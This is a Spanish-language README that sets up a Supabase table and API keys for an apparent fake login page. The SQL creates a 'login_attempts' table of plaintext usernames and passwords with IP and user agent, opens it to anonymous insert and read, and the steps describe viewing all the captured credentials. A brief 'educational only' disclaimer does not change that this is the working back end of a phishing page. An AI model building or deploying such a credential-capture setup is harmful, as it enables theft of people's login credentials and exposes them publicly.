# Configuración de Supabase

## Paso 1: Crear cuenta en Supabase

1. Ve a https://supabase.com
2. Crea una cuenta o inicia sesión
3. Crea un nuevo proyecto

## Paso 2: Crear la tabla en la base de datos

1. Una vez dentro de tu proyecto, ve a **SQL Editor** (barra lateral izquierda)
2. Haz clic en **"New query"**
3. Copia y pega el siguiente SQL:

```sql
-- Crear la tabla para almacenar intentos de login
CREATE TABLE IF NOT EXISTS login_attempts (
    id BIGSERIAL PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    timestamp TIMESTAMPTZ DEFAULT NOW(),
    ip_address TEXT,
    user_agent TEXT
);

-- Hacer la tabla pública para lectura y escritura
ALTER TABLE login_attempts ENABLE ROW LEVEL SECURITY;

-- Crear política para permitir insertar datos sin autenticación
CREATE POLICY "Allow anonymous insert" ON login_attempts
    FOR INSERT
    WITH CHECK (true);

-- Crear política para permitir lectura (opcional, para ver los datos)
CREATE POLICY "Allow anonymous read" ON login_attempts
    FOR SELECT
    USING (true);
```

4. Haz clic en **"Run"** o presiona `Ctrl + Enter` (o `Cmd + Enter` en Mac)

## Paso 3: Obtener las credenciales de API

1. Ve a **Project Settings** (ícono de engranaje en la barra lateral)
2. Selecciona **API** en el menú
3. Copia los siguientes valores:
   - **Project URL**: Esto es tu `SUPABASE_URL`
   - **anon public key**: Esto es tu `SUPABASE_ANON_KEY`

## Paso 4: Configurar tu aplicación

1. Abre el archivo `config.js`
2. Reemplaza los valores:
   - Reemplaza `YOUR_SUPABASE_URL_HERE` con tu **Project URL**
   - Reemplaza `YOUR_SUPABASE_ANON_KEY_HERE` con tu **anon public key**

Ejemplo:
```javascript
const SUPABASE_URL = 'https://tuproyecto.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';
```

## Paso 5: Verificar que funciona

1. Abre `index.html` en tu navegador
2. Ingresa cualquier usuario y contraseña
3. Haz clic en "Log In"
4. Ve a Supabase → **Table Editor** → **login_attempts**
5. Deberías ver los datos que ingresaste

## Ver tus datos

Para ver todos los intentos de login capturados:
1. Ve a **Table Editor** en Supabase
2. Selecciona la tabla **login_attempts**
3. Verás todas las credenciales que se han ingresado

## Notas de seguridad

⚠️ **IMPORTANTE**: Este proyecto es solo para fines educativos. No uses esto en producción sin implementar autenticación y seguridad adecuada.

- La tabla es accesible públicamente, cualquiera puede ver todos los datos
- No hay validación ni encriptación de datos
- Considera usar variables de entorno para las credenciales en producción

